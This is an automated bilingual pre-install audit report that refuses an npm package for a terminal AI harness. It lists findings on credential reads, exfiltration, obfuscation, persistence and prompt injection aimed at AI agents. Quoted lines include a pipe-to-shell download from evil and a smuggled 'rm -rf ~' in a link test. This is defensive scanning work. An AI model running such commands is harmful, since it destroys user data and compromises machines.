> 批量压测 / Batch stress test · ★ 3110 · `ccch1mneyyy/dsh-TUI`
> https://github.com/ccch1mneyyy/dsh-TUI · audited in 7.3s
# 安装前体检 / Pre-install audit: @deepseek-harness-tui/dsh-tui@0.10.2

**信任评级 / Trust grade: D** (评分 / score 0/100 — 拒绝：存在严重风险信号 / refused: critical risk signals)

> **拒绝安装。** 该来源达到了配置的拒绝阈值。请先修复严重问题；若你已读过报告并接受风险，可把该包加入 `install.allow`。 / **Install refused.** This source met the configured refusal floor. Fix the critical findings, or add the package to `install.allow` if you have read them and accept the risk.

> **部分扫描。** 大小或文件数上限使分析提前结束，因此该评级只覆盖已读取的部分。 / **Partial scan.** A size or file-count cap stopped the analysis early, so this grade covers only the part that was read.

- 来源 / Source: `https://codeload.github.com/ccch1mneyyy/dsh-TUI/tar.gz/HEAD` (URL / url)
- 已分析文件：1006 个（10.6 MiB） / Files analysed: 1006 (10.6 MiB)
- 内容摘要 / Content digest: `879eb65a428ff6492e9305fab762270f…`
- 体检时间 / Audited at: 2026-09-20T09:51:57.995Z

## 最严重的风险 / Most severe risk

**凭据读取、解码步骤与对外请求同时出现 / Credential read, decoding step and outbound request together** `exfil.credential-read-decode-callback`

中 数据会离开这台机器。该包中有代码把本机上的内容发往外部地址。
EN Data leaves this machine. Something in this package takes content that lives here and sends it to a destination outside it.

该包会访问的目标：`github.com`、`registry.npmjs.org`、`harness-telemetry.deepseeksvc.com`、`www.w3.org`、`example.com`、`dshtui.com`、`nodejs.org`、`registry.npmmirror.com` / Destinations this package reaches: `github.com`, `registry.npmjs.org`, `harness-telemetry.deepseeksvc.com`, `www.w3.org`, `example.com`, `dshtui.com`, `nodejs.org`, `registry.npmmirror.com`

- 中 它发生在安装时：`prepare` 脚本会执行它，你不需要自己运行任何东西。
  EN It happens at install time: the `prepare` script runs it, so you do not have to run anything yourself.
- 中 其中一部分经过混淆，源码看不出真正执行的是什么。
  EN Part of it is obfuscated, so the source does not show what actually executes.
- 中 它还安排了之后继续运行，所以仅仅卸载这个包并不够。
  EN It also arranges to run again later, so removing the package is not enough on its own.
- 中 本次扫描不完整，因此可能还有内容根本没被读到。
  EN The scan was partial, so there may be more that was never read.

决定该评级的规则命中于 `bin/dsh-tui.js:292`；完整列表见下方「发现」。 / The rule that decided the grade fired at `bin/dsh-tui.js:292`; the full list is under Findings below.

## 安装期脚本 / Install-time scripts

- `prepare` (`package.json`): `node scripts/prepare-guard.mjs && npm run compile`

## 该插件能触及什么 / What this plugin can reach

- **读取的文件路径 / File paths read:** `node:fs/promises`, `.github/APPROVED_CONTRIBUTORS`, `.credentials.yaml`, `resume.txt`, `~/.dsh-tui/resume.txt`, `trace.jsonl`, `\n`, `settings.yaml`, `package.json`, `/tmp/cap-tui.bin`, `.env`, `packages/ui/dsh-tui/cordis.patch.yml` （另有 87 项） / (+87 more)
- **写入的文件路径 / File paths written:** `src/plugin-host.ts`, `./impl.js`, `file.txt`, `sessions.sqlite`, `\n`, `.frames`, `/tmp/tui-stream.bin`, `theme.json`, `lang.json`, `model.json`, `working-activity.json`, `package.json` （另有 81 项） / (+81 more)
- **派生的命令 / Commands spawned:** `node:child_process`, `git`, `-C`, `--version`, `pipe`, `utf8`, `dsh`, `pnpm`, `--profile`, `dsh-tui`, `powershell`, `zip` （另有 75 项） / (+75 more)
- **连接的域名 / Domains contacted:** `github.com`, `registry.npmjs.org`, `harness-telemetry.deepseeksvc.com`, `www.w3.org`, `example.com`, `dshtui.com`, `nodejs.org`, `registry.npmmirror.com`, `platform.deepseek.com`, `server-url`, `api.example.com`, `host` （另有 34 项） / (+34 more)
- **读取的环境变量 / Environment variables read:** `GITHUB_WORKSPACE`, `DSH_TUI_STANDALONE_BINARY`, `DSH_TUI_LANG`, `NODE_ENV`, `DSH_HOME`, `DEEPSEEK_API_KEY`, `DSH_TUI_NO_DELEGATE`, `DSH_TUI_LAUNCHER_VERSION`, `process.env (every variable)`, `DSH_TUI_RESUME_SESSION`, `DSH_TUI_WORKSPACE_TARGET`, `DSH_TUI_PERSONA` （另有 83 项） / (+83 more)

## 发现 / Findings

### 严重 / CRITICAL (7)

- **严重 / CRITICAL** `cred.read-dsh-credentials` — 读取 DSH 凭据或会话存储 / Reads DSH credentials or session storage
  中 该行读取了 `~/.dsh`，其中存放着宿主的 API 凭据、profile、已保存的会话和插件状态。读取宿主自己的密钥库，等于把用户的模型凭据和对话历史交给插件。
  EN This line reads `~/.dsh`, which holds the harness API credentials, profiles, stored sessions and plugin state. Reading the harness's own secret store hands the plugin the user's model credentials and conversation history.
  - `bin/dsh-tui.js:292` — `const text = readFileSync(join(home, '.credentials.yaml'), 'utf8')`
  - `scripts/dev-test.mjs:142` — `const hasCredentials = existsSync(join(dshHome, '.credentials.yaml'))`
  - `scripts/verify-dev-command.mjs:50` — `assert.equal(readFileSync(join(copied.dshHome, '.credentials.yaml'), 'utf8'), 'test: secret\n')`
  - `scripts/verify-dev-command.mjs:54` — `assert.equal(statSync(join(copied.dshHome, '.credentials.yaml')).mode & 0o777, 0o600)`
  - ……另有 1 处 / … and 1 more location(s)
  中 修复：删除这次读取。插件应通过 DSH 的配置接口获得配置，绝不打开凭据文件。
  EN Fix: Remove the read. A plugin should receive configuration through the DSH config surface, never by opening the credentials file.
- **严重 / CRITICAL** `destructive.shipped-command` — 内置破坏性文件系统命令 / Ships a destructive filesystem command
  中 抹掉用户主目录、根文件系统或分区的命令出现在可执行内容里，而不是文档描述中。即便有条件判断保护，这种原语也绝不该被塞进插件里。
  EN A command that erases a home directory, a root filesystem or a partition appears in executable content rather than in prose. Even guarded by a condition, it is a primitive that should never travel inside a plugin.
  - `scripts/verify-osc8-sanitize.tsx:70` — `const out = link('http://evil.com/\x07;rm -rf ~')`
  中 修复：删除该命令。插件如果必须清理，应把删除限定在它自己创建的目录，并以包根目录为基准解析这个路径。
  EN Fix: Delete the command. If a plugin must clean up, restrict deletion to a directory it created and resolve that path from the package root.
- **严重 / CRITICAL** `exfil.credential-read-decode-callback` — 凭据读取、解码步骤与对外请求同时出现 / Credential read, decoding step and outbound request together
  中 编码外传的三个要素全部齐备：读取了凭据，有解码或编码动作，并且有请求离开本机。编码这一步的作用，正是让随便看一眼流量的人看不出其中的密钥。
  EN All three ingredients of an encoded exfiltration are present: a credential is read, something is decoded or encoded, and a request leaves the machine. The encoding step is what hides the secret from a casual look at the traffic.
  - `bin/dsh-tui.js:292` — `const text = readFileSync(join(home, '.credentials.yaml'), 'utf8')`
  - `scripts/dev-test.mjs:142` — `const hasCredentials = existsSync(join(dshHome, '.credentials.yaml'))`
  - `scripts/verify-dev-command.mjs:50` — `assert.equal(readFileSync(join(copied.dshHome, '.credentials.yaml'), 'utf8'), 'test: secret\n')`
  - `scripts/analyze-heapsnapshot-stream.cjs:106` — `if (c >= 48 && c <= 57) { numBuf += String.fromCharCode(c) }`
  - ……另有 3 处 / … and 3 more location(s)
  中 修复：删除凭据读取或对外调用。绝不要发布既接触密钥、又在向外发送途中编码载荷的包。
  EN Fix: Remove the credential read or the outbound call. Never ship a package that both touches secrets and encodes a payload on its way out.
- **严重 / CRITICAL** `exfil.credential-read-then-callback` — 同一个包内既有凭据文件读取又有对外请求 / Credential file read and an outbound request in the same package
  中 既读取凭据文件又发起对外请求的包，已经凑齐了窃取凭据的两半。单独看每一半都能找到理由，合在一起就只能解释为数据被送出本机。
  EN A package that reads a credential file and also makes outbound requests has the two halves of credential theft. Individually each half can be justified; together they only make sense as data leaving the machine.
  - `bin/dsh-tui.js:292` — `const text = readFileSync(join(home, '.credentials.yaml'), 'utf8')`
  - `scripts/dev-test.mjs:142` — `const hasCredentials = existsSync(join(dshHome, '.credentials.yaml'))`
  - `scripts/verify-dev-command.mjs:50` — `assert.equal(readFileSync(join(copied.dshHome, '.credentials.yaml'), 'utf8'), 'test: secret\n')`
  - `pnpm-lock.yaml:2906` — `gaxios@7.3.1:`
  - ……另有 2 处 / … and 2 more location(s)
  中 修复：删除凭据读取。如果对外调用才是真正的功能，那么包内任何地方都不应在它之前读取密钥文件。
  EN Fix: Remove the credential read. If the outbound call is the real feature, it must not be preceded by a read of a secret file anywhere in the package.
- **严重 / CRITICAL** `exfil.environment-harvest-then-callback` — 同一个包内既有环境变量收集又有对外请求 / Environment harvest and an outbound request in the same package
  中 该包读取或整体导出进程环境变量，同时又建立对外连接。CI 运行器和宿主会话都会把 API Key 导出到环境变量中，因此这一组合会把仍有效的凭据送出本机。
  EN The package reads or dumps process environment values and also opens outbound connections. CI runners and harness sessions export API keys into the environment, so this combination sends working credentials off the machine.
  - `scripts/verify-sixel-transcript.tsx:351` — `Object.keys(process.env`
  - `scripts/verify-sixel-transcript.tsx:352` — `Object.assign(process.env`
  - `scripts/verify-terminal-images-sixel.tsx:408` — `Object.assign(process.env`
  - `pnpm-lock.yaml:2906` — `gaxios@7.3.1:`
  - ……另有 2 处 / … and 2 more location(s)
  中 修复：删除环境变量的整体导出，只逐个读取插件确实需要、且有文档说明的变量。
  EN Fix: Remove the environment dump, and read only individually documented variables that the plugin actually needs.
- **严重 / CRITICAL** `obf.obfuscation-with-network-callback` — 混淆代码叠加对外网络访问 / Obfuscated code and outbound network access
  中 该包既隐藏了自己的写法，又建立对外连接。在插件里，混淆除了让载荷读不懂之外没有任何用处；再加上回调，就是分阶段植入物的标准形态。
  EN The package hides how it is written and also makes outbound connections. Obfuscation has no purpose in a plugin except to keep the payload unreadable, and paired with a callback it is the standard shape of a staged implant.
  - `scripts/spacing-probe.tsx:256` — `valuetpsμp95sparkline`
  - `pnpm-lock.yaml:2906` — `gaxios@7.3.1:`
  - `pnpm-lock.yaml:3059` — `node-fetch@3.3.2:`
  - `pnpm-lock.yaml:3248` — `undici-types@8.3.0:`
  中 修复：不要安装这个包。如果确实需要它，必须先要求对方提供可读源码，才能在任何地方使用。
  EN Fix: Do not install this package. If it is genuinely needed, require readable source before it is used anywhere.
- **严重 / CRITICAL** `priv.curl-pipe-shell` — 把下载内容直接管道给 shell / Pipes a download straight into a shell
  中 一步完成“拉取脚本并执行”，运行的就是远端服务器当时返回的任何内容；既没有可计算哈希、可审查、可固定版本的产物，服务器一旦被攻破就等于这台机器被攻破。
  EN Fetching a script and executing it in one step runs whatever the remote server returns at that moment; there is no artifact to hash, review or pin, and a compromise of the server becomes a compromise of this machine.
  - `scripts/verify-approval-visibility.tsx:167` — `curl http://evil/x.sh | sh`
  中 修复：先下载产物、校验其校验和，再执行校验通过的文件；绝不要把下载内容管道给解释器。
  EN Fix: Download the artifact, verify its checksum, and execute the verified file; never pipe a download into an interpreter.

### 高 / HIGH (18)

- **高 / HIGH** `cred.credential-read-with-command-execution` — 同一个包内既有凭据文件读取又有 shell 执行 / Credential file read and shell execution in the same package
  中 这个包里某处读取了凭据文件，另一处又启动了进程。仅这一组合就足以把密钥管道给命令、通过 CLI 把它外传，或用窃取到的材料改写本机配置。
  EN A credential file is read somewhere in this package and a process is spawned somewhere else. That pairing is enough to pipe a secret into a command, exfiltrate it through a CLI, or rewrite the machine's configuration from stolen material.
  - `bin/dsh-tui.js:292` — `const text = readFileSync(join(home, '.credentials.yaml'), 'utf8')`
  - `scripts/dev-test.mjs:142` — `const hasCredentials = existsSync(join(dshHome, '.credentials.yaml'))`
  - `scripts/verify-dev-command.mjs:50` — `assert.equal(readFileSync(join(copied.dshHome, '.credentials.yaml'), 'utf8'), 'test: secret\n')`
  - `.agents/skills/review/scripts/contract-snapshot.mjs:3` — `import { execFileSync } from 'node:child_process'`
  - ……另有 2 处 / … and 2 more location(s)
  中 修复：删除凭据读取，并把进程启动限制在完全不会接触到密钥值的命令上。
  EN Fix: Remove the credential access, and keep process spawning limited to commands that never see secret values.
- **高 / HIGH** `cred.env-harvest` — 读取或整体导出进程环境变量 / Reads or dumps the process environment
  中 该行把整个环境当成一个值取走——序列化、遍历或打印它，而不是只取自己需要的那一个变量。CI 运行器和宿主都会把 API Key 导出到环境变量里，因此整体导出就是一次凭据收集。
  EN The line takes the whole environment as a value — serializing it, iterating it, or printing it — rather than the one variable it needs. CI runners and the harness export API keys into the environment, so a dump is a credential harvest.
  - `scripts/verify-sixel-transcript.tsx:351` — `Object.keys(process.env`
  - `scripts/verify-sixel-transcript.tsx:352` — `Object.assign(process.env`
  - `scripts/verify-terminal-images-sixel.tsx:408` — `Object.assign(process.env`
  - `scripts/verify-terminal-images-sixel.tsx:419` — `Object.keys(process.env`
  - ……另有 1 处 / … and 1 more location(s)
  中 修复：只逐个读取插件文档中声明过的变量，绝不序列化整个环境对象，也不要把它写进日志或请求。
  EN Fix: Read only the variables the plugin documents, one at a time, and never serialize the environment object or forward it into a log or request.
- **高 / HIGH** `cred.read-registry-token` — 读取包仓库令牌文件 / Reads a package registry token file
  中 该行读取了 `.npmrc`、`.yarnrc`、`.pypirc` 或同类凭据文件。这些文件里保存的发布令牌可以让攻击者以用户的名义发布新版本。
  EN The line reads `.npmrc`, `.yarnrc`, `.pypirc` or an equivalent credential file. Those files carry publish tokens that let an attacker push new versions under the user's name.
  - `src/update.ts:177` — `const npmrc = readFileSync(join(homedir(), '.npmrc'), 'utf8')`
  中 修复：在真正需要的时刻从环境变量读取令牌，并删除所有打开仓库配置文件的代码。
  EN Fix: Read the token from the environment at the moment it is needed, and delete any code that opens the registry config file.
- **高 / HIGH** `destructive.recursive-delete-system-path` — 递归删除指向用户主目录或系统目录 / Recursive delete aimed at a home or system directory
  中 递归删除的目标是用户主目录或系统路径，一旦变量写错、展开为空或缺少判空保护，被销毁的就是用户数据而不是包自己的构建产物。
  EN A recursive delete targets a home directory or a system path, so a wrong variable, an empty expansion or a missing guard destroys user data instead of the package's own build output.
  - `scripts/verify-osc8-sanitize.tsx:70` — `const out = link('http://evil.com/\x07;rm -rf ~')`
  中 修复：只删除包在自己目录下创建的路径，并在解析出的路径不位于该目录内时拒绝执行。
  EN Fix: Delete only paths the package created under its own directory, and refuse to run when the resolved path is not inside it.
- **高 / HIGH** `exfil.clipboard-read-then-callback` — 同一个包内既有剪贴板读取又有对外请求 / Clipboard read and an outbound request in the same package
  中 该包读取系统剪贴板，同时发起对外请求。剪贴板里有刚刚复制过的密码和令牌，而这个包里没有任何东西能解释这两种行为为何同时存在。
  EN The package reads the system clipboard and also makes outbound requests. Clipboards hold passwords and tokens that were copied moments earlier, and nothing in this package explains why the two behaviors coexist.
  - `scripts/repro-clipboard.tsx:32` — `wl-paste`
  - `scripts/repro-clipboard.tsx:40` — `wl-paste`
  - `pnpm-lock.yaml:2906` — `gaxios@7.3.1:`
  - `pnpm-lock.yaml:3059` — `node-fetch@3.3.2:`
  - ……另有 1 处 / … and 1 more location(s)
  中 修复：删除剪贴板读取，或让目标地址默认不可达，并向用户说明。
  EN Fix: Remove the clipboard read, or make the destination unreachable by default and documented for the user.
- **高 / HIGH** `net.excessive-distinct-hosts` — 包连接的不同主机数量多得不合常理 / Package contacts an implausible number of distinct hosts
  中 对外目标涉及的主机数量超出插件合理所需。这种大面积铺开，正是让遥测、中继和投放服务躲在每一个都看似平常的端点之间的办法。
  EN The package reaches 44 distinct remote hosts (dshtui.com, example.com, github.com, harness-telemetry.deepseeksvc.com, nodejs.org, registry.npmjs.org, registry.npmmirror.com, www.w3.org, …). That is far more than a plugin needs, and the report cannot attribute the surplus to any documented feature.
  - `.github/ISSUE_TEMPLATE/config.yml:4` — `https://github.com/ccch1mneyyy/dsh-TUI/discussions/new?category=ideas`
  - `.github/scripts/pr-intake/gate.mjs:21` — `https://github.com/${context.repo.owner`
  - `.github/workflows/publish.yml:35` — `https://registry.npmjs.org`
  - `.gitmodules:3` — `https://github.com/T-Auto/dsh-ecosystem-spec.git`
  中 修复：把目标列表收敛到有文档说明的服务，删除插件无法给出理由的任何端点。
  EN Fix: Reduce the destination list to the documented service, and remove any endpoint the plugin cannot justify.
- **高 / HIGH** `net.raw-ip-destination` — 向裸 IP 地址发送请求 / Sends a request to a bare IP address
  中 目标写成了数字地址而不是主机名，因此绕过 DNS、无法归属到任何域名，而且通常指向内网网段，或指向并非插件所声称对接的服务。
  EN The destination is written as a numeric address rather than a hostname, so it bypasses DNS, cannot be attributed to a domain, and usually points at a private range or a host that is not the service the plugin claims to talk to.
  - `scripts/verify-provider-wizard.mjs:314` — `'baseurl': { custom: 'http://127.0.0.1:11434/v1' },`
  - `scripts/verify-update-checksum.tsx:111` — `{ name: ASSET_NAME, browser_download_url: `http://127.0.0.1:${serverPort()}/asset` },`
  - `scripts/verify-update-checksum.tsx:114` — `assets.push({ name: 'SHA256SUMS', browser_download_url: `http://127.0.0.1:${serverPort()}/SHA256SUMS` })`
  - `scripts/verify-update-checksum.tsx:117` — `assets.push({ name: `${ASSET_NAME}.sha256`, browser_download_url: `http://127.0.0.1:${serverPort()}/${ASSET_NAME}.sha256` })`
  - ……另有 3 处 / … and 3 more location(s)
  中 修复：使用文档中说明的主机名并通过 HTTPS 访问，删除所有能被指向裸地址的代码。
  EN Fix: Use the documented hostname over HTTPS, and remove any code that can be pointed at a raw address.
- **高 / HIGH** `obf.decoded-payload-literal` — 携带解码、转义或高熵字面量 / Carries a decoded, escaped or high-entropy literal
  中 一个很长的字面量会在运行时被解码（base64、`atob`、`unescape`、`decodeURIComponent`），或者写满了密集的十六进制、Unicode 转义，或者呈现出编码数据块那种近乎均匀的字符分布。
  EN A long literal is decoded at runtime (base64, `atob`, `unescape`, `decodeURIComponent`), written with dense hex or unicode escapes, or has the near-uniform character distribution of an encoded blob.
  - `src/terminal-utils/hyperlink.ts:52` — `/[\u001b\u009b][[\]()#;?]*(?:[0-9]{1,4}(?:;[0-9]{0,4})*)?[0-9A-ORZcf-nqry=><~]|\u001b\][^\u0007\u001b]*(?:\u0007|\u001b\\)|[\x00-\x1f\x7f-\x9f]/g`
  中 修复：把该值保存为可读源码，或保存为格式有文档说明的数据，让审查者能看清实际运行的到底是什么。
  EN Fix: Store the value as readable source or as data with a documented format, so a reviewer can see what is actually being run.
- **高 / HIGH** `obf.dynamic-require` — require 或 import 了动态计算的模块路径 / Requires or imports a computed module path
  中 模块路径是计算出来的而非字面量，真正被加载的包由运行时决定，光看 import 语句根本查不出来。
  EN The module path is computed rather than written literally, so the package that actually gets loaded is decided at runtime and cannot be checked by reading the imports.
  - `bin/dsh-tui.js:496` — `;({ cliUpdate } = await import(pathToFileURL(join(profilePkgDir, 'lib', 'types', 'update.js')).href))`
  - `scripts/probe.ts:16` — `const mod = await import(name)`
  - `scripts/pty-conpty-probe.mjs:11` — `const pty = require(PTY)`
  - `scripts/pty-conpty-stress.mjs:11` — `const pty = require(PTY)`
  - ……另有 10 处 / … and 10 more location(s)
  中 修复：使用静态的 import 说明符，或用一张显式表把已知键映射到静态 import。
  EN Fix: Use a static import specifier, or an explicit table mapping known keys to static imports.
- **高 / HIGH** `obf.obfuscation-with-command-execution` — 混淆代码叠加进程执行 / Obfuscated code and process execution
  中 该包隐藏了自己的字符串或标识符，同时又启动进程。这样一来，读源码也无法告诉审查者实际跑的到底是哪条命令。
  EN The package hides its strings or identifiers and also spawns processes. Reading the source then tells the reviewer nothing about which command is actually run.
  - `scripts/spacing-probe.tsx:256` — `valuetpsμp95sparkline`
  - `.agents/skills/review/scripts/contract-snapshot.mjs:3` — `import { execFileSync } from 'node:child_process'`
  - `.agents/skills/review/scripts/contract-snapshot.mjs:38` — `return execFileSync('git', ['-C', repo, ...args], {`
  - `bin/dsh-tui.js:30` — `import { spawn, spawnSync } from 'node:child_process'`
  中 修复：要求提供可读源码：把编码值换成字面量，把动态计算的模块路径换成静态 import。
  EN Fix: Require readable source: replace the encoded values with literals and the computed module paths with static imports.
- **高 / HIGH** `persist.dsh-settings-rewrite` — 改写 DSH 配置或 profile / Rewrites DSH settings or profiles
  中 该行写入了宿主配置（`~/.dsh/settings.yaml`、profile 或 storages）。改动 profile 会改变此后每次宿主启动时加载哪些插件，以及它们如何配置。
  EN The line writes into the harness configuration (`~/.dsh/settings.yaml`, profiles or storages). Changing the profile changes which plugins load and how they are configured on every future harness start.
  - `src/dsh-adapter/channel/reports.ts:147` — `for (const candidate of [join(homeDir(), '.dsh-tui/cordis.yml'), join(homeDir(), '.dsh/profiles/dsh-tui/cordis.patch.yml')]) {`
  - `src/dsh-adapter/channel/reports.ts:147` — `.dsh-tui/cordis.yml.dsh/profiles/dsh-tui/cordis.patch.yml`
  - `src/dsh-adapter/channel/reports.ts:147` — `.dsh-tui/cordis.yml/.dsh/profiles/dsh-tui/cordis.patch.yml`
  - `src/i18n.ts:103` — `'mcp-insert-hint': { zh: '在 profile 补丁层（~/.dsh/profiles/dsh-tui/cordis.patch.yml）insert 一行即可，例：', en: 'Insert one line in the profile patch layer (~/.dsh/profil…`
  - ……另有 1 处 / … and 1 more location(s)
  中 修复：把用户应当应用的配置打印出来，而不是直接写宿主的运行状态。
  EN Fix: Print the configuration the user should apply instead of writing the harness state directly.
- **高 / HIGH** `persist.global-self-install` — 全局安装依赖包 / Installs a package globally
  中 该命令把包安装到全局前缀，于是用户的 PATH 上多出一个可执行文件，而且当前项目删除后它仍然留在那里。
  EN The command installs a package into the global prefix, which puts a new executable on the user's PATH and keeps it there after the current project is deleted.
  - `bin/dsh-tui.js:126` — `npm install -g`
  - `bin/dsh-tui.js:127` — `npm install -g`
  - `bin/dsh-tui.js:130` — `npm install -g`
  - `bin/dsh-tui.js:131` — `npm install -g`
  - ……另有 24 处 / … and 24 more location(s)
  中 修复：改为本地安装，并通过项目自身的脚本调用该工具；全局安装应由用户自己决定，而不是由插件代劳。
  EN Fix: Install locally and invoke the tool through the project's own scripts; global installs belong to the user's decision, not to a plugin.
- **高 / HIGH** `persist.persistence-with-install-hook` — 安装钩子叠加持久化机制 / Install hook combined with a persistence mechanism
  中 生命周期钩子在安装期间运行，而目录树中又有东西把自己注册为稍后运行。这一组合会在用户以为只是一次普通依赖安装的过程中装入一个常驻组件。
  EN A lifecycle hook runs during install and something in the tree registers itself to run later. The combination installs a resident component during what the user believed was a normal dependency install.
  - `src/adapter/standard/registry.ts:61` — `&& value.profile.length > 0`
  - `src/dsh-adapter/channel/reports.ts:147` — `for (const candidate of [join(homeDir(), '.dsh-tui/cordis.yml'), join(homeDir(), '.dsh/profiles/dsh-tui/cordis.patch.yml')]) {`
  - `src/dsh-adapter/channel/reports.ts:147` — `.dsh-tui/cordis.yml.dsh/profiles/dsh-tui/cordis.patch.yml`
  - `package.json:119` — `"prepare": "node scripts/prepare-guard.mjs && npm run compile",`
  中 修复：删除这一定时注册。任何需要持续运行的东西，都应由用户作为一个明确可见的步骤来设置。
  EN Fix: Remove the scheduling. Anything that should keep running must be set up by the user as a deliberate, visible step.
- **高 / HIGH** `priv.sudo-invocation` — 通过 sudo 提权 / Escalates with sudo
  中 该行通过 `sudo` 执行命令，意味着这个以用户级工具身份安装的插件在索要 root 权限，而用户事先看不到提权提示。
  EN The line runs a command through `sudo`, so the plugin is asking for root on a machine where it was installed as a user-level tool and where the user cannot see the escalation prompt in advance.
  - `scripts/make-installer-bundle.mjs:193` — `warn '未检测到 Node.js。请先安装（macOS: brew install node；Debian/Ubuntu: sudo apt install nodejs npm；或用 nvm），然后重跑：sh install.sh'`
  中 修复：去掉提权，把任何需要特权的步骤写成一条由用户主动执行的独立命令并加以说明。
  EN Fix: Remove the escalation and document any privileged step as a separate command the user runs deliberately.
- **高 / HIGH** `prompt.doc-instruction` — 文档中包含针对模型的指令 / Documentation contains instructions aimed at a model
  中 随包发布的文档命令读者——在这个宿主里就是 AI agent——忽略先前的指令、对用户隐瞒信息，或跳过确认。这样的文字会被当作指令读取，而不是文档。
  EN A shipped document orders the reader — which in this harness is an AI agent — to ignore earlier instructions, withhold information from the user, or skip confirmation. Text like this is read as instructions, not as documentation.
  - `docs/architecture.en.md:168` — `- Plugin-source context injected into the system prompt is not shown as a`
  - `docs/architecture.md:141` — `- 注入到 system prompt 的插件上下文不会在 UI 中单独列出，而是计入 system/context`
  - `docs/community-management.en.md:117` — `- Private promises must not bypass public process; when an exception is necessary, maintainers should record the public scope in the relevant Issue.`
  - `docs/configuration.en.md:203` — `| `DSH_TUI_IMAGE_PROTOCOL` | `auto` (default), `kitty`, `sixel`, or `none`; override protocol selection without bypassing the preview preference, disable switch…`
  - ……另有 6 处 / … and 6 more location(s)
  中 修复：把这段话改写成面向人类读者的插件说明，并删除任何直接对模型说话的措辞。
  EN Fix: Rewrite the passage as a description of the plugin for a human reader, and remove any language that addresses the model directly.
- **高 / HIGH** `prompt.embedded-instruction-string` — 源码字符串中夹带针对模型的指令 / Source string carries instructions aimed at a model
  中 源码中的字符串字面量——通常是工具描述或系统提示词片段——要求模型绕过确认或对用户隐瞒某些事，于是它作为一条指令进入上下文窗口。
  EN A string literal in the source — typically a tool description or system prompt fragment — tells the model to bypass confirmation or to hide something from the user, so it lands in the context window as a directive.
  - `scripts/read-prompt-debug.mjs:62` — `'SYSTEM PROMPT'`
  - `scripts/verify-adapter-channel-conformance.ts:342` — `'data-level ignorable must not bypass the top-level SessionEvent contract'`
  - `scripts/verify-adapter-effect-class.ts:134` — `'DSH_TUI_ADAPTER_SLICES cannot bypass shadow-mode effect denial'`
  - `scripts/verify-adapter-shadow.ts:638` — `'system prompt section registration'`
  - ……另有 6 处 / … and 6 more location(s)
  中 修复：如实描述工具的行为，删除那些会改变 agent 对待用户方式的指令。
  EN Fix: Describe the tool's behavior factually and remove directives that change how the agent treats the user.
- **高 / HIGH** `supply.typosquat-name` — 依赖名与热门包高度形近 / Dependency name is a near-miss of a popular package
  中 该依赖名是已知的仿冒包，或与某个热门包只差一个字母或一处字符顺序，安装它极可能拉进作者从未打算依赖的包。
  EN The dependency name is a known impostor, or differs from a popular package by a single typo or transposition, so installing it most likely pulls a package the author never intended to depend on.
  - `package.json:348` — `"@deepseek-harness-tui/dsh-auth": "link:./dsh-auth",`
  - `standalone/package.json:34` — `"@deepseek-harness-tui/dsh-tui": "0.9.2",`
  中 修复：对照你本意要安装的包核对其拼写，并把该条目改成真正的包名。
  EN Fix: Check the spelling against the package you meant to install and replace the entry with the real name.
- **高 / HIGH** `supply.url-dependency` — 依赖解析到 URL、git 引用或文件路径 / Dependency resolves to a URL, git ref or file path
  中 依赖不是从仓库解析，而是来自 URL、git 引用、本地路径或 patch，因此其内容不受仓库锁文件和任何完整性元数据约束，可以在版本号不变的情况下被替换。
  EN A dependency is resolved from a URL, a git reference, a local path or a patch instead of the registry, so its contents are not covered by the registry lockfile or by any integrity metadata and can change without a version bump.
  - `package.json:348` — `"@deepseek-harness-tui/dsh-auth": "link:./dsh-auth",`
  - `package.json:349` — `"@dsh-std/command": "workspace:*",`
  - `package.json:350` — `"@dsh-std/connection": "workspace:*",`
  - `package.json:351` — `"@dsh-std/core": "workspace:*",`
  - ……另有 1 处 / … and 1 more location(s)
  中 修复：改为依赖仓库中已发布的版本，并用锁文件固定；如果确实必须用 fork，就把它发布到自己名下的 scope。
  EN Fix: Depend on a published version from the registry, pinned by a lockfile; if a fork is unavoidable, publish it under your own scope.

### 中 / MEDIUM (13)

- **中 / MEDIUM** `cred.many-secret-env-vars` — 读取多个不同名称的密钥类环境变量 / Reads several differently-named secret environment variables
  中 这里的一行、或整个包里的若干行，读取了名称看起来像凭据的环境变量。只读一个文档中声明的 key 是插件本该有的认证方式；枚举多个不同名称的密钥，则是在收集凭据而不是在使用凭据。
  EN One line here, or several across the package, read environment variables whose names look like credentials. Reading a single documented key is how a plugin is meant to authenticate; enumerating many differently-named ones is how credentials are gathered rather than used.
  - `bin/dsh-tui.js:351` — `process.env.DEEPSEEK_API_KEY`
  - `scripts/run.ts:93` — `process.env.DEEPSEEK_API_KEY`
  - `scripts/run.ts:99` — `process.env.DEEPSEEK_API_KEY`
  - `scripts/run.ts:122` — `process.env.DEEPSEEK_API_KEY`
  - ……另有 3 处 / … and 3 more location(s)
  中 修复：只保留插件确实需要且有文档说明的变量，删掉与任何功能无关的密钥读取。
  EN Fix: Keep to the variables this plugin documents and needs, and delete reads of keys it has no feature for.
- **中 / MEDIUM** `cred.read-dotenv-or-history` — 读取 dotenv 文件或 shell 历史 / Reads a dotenv file or shell history
  中 该行读取了 `.env` 或 shell 历史文件。这两处都是令牌、云密钥和曾经粘贴过的密钥堆积的地方，而 shell 历史还会勾勒出用户的基础设施全貌。
  EN This line reads `.env` or a shell history file. Both are where tokens, cloud keys and previously pasted secrets accumulate, and a shell history also maps out the user's infrastructure.
  - `scripts/run.ts:95` — `const text = readFileSync(resolve(workspace, '.env'), 'utf8')`
  中 修复：通过插件配置 schema 加载配置，而不是读取 dotenv 文件；永远不要打开用户的历史记录。
  EN Fix: Load configuration through the plugin config schema instead of reading dotenv files, and never open the user's history.
- **中 / MEDIUM** `exfil.clipboard-read` — 读取系统剪贴板 / Reads the system clipboard
  中 该行通过 `pbpaste`、`xclip`、`wl-paste`、`Get-Clipboard` 或 `clipboardy` 读取剪贴板。剪贴板里经常放着刚刚复制过的密码、令牌和私密文本。
  EN The line reads the clipboard through `pbpaste`, `xclip`, `wl-paste`, `Get-Clipboard` or `clipboardy`. Clipboards routinely hold passwords, tokens and private text that were copied moments earlier.
  - `scripts/repro-clipboard.tsx:32` — `wl-paste`
  - `scripts/repro-clipboard.tsx:40` — `wl-paste`
  - `scripts/verify-clipboard.mjs:157` — `xclip`
  - `scripts/verify-clipboard.mjs:161` — `xclip`
  - ……另有 19 处 / … and 19 more location(s)
  中 修复：通过插件配置向用户索取该值，而不是读取剪贴板上恰好存在的内容。
  EN Fix: Ask the user for the value through the plugin config instead of reading whatever happens to be on the clipboard.
- **中 / MEDIUM** `harness.reserved-tool-name` — 用保留名称注册工具 / Registers a tool under a reserved name
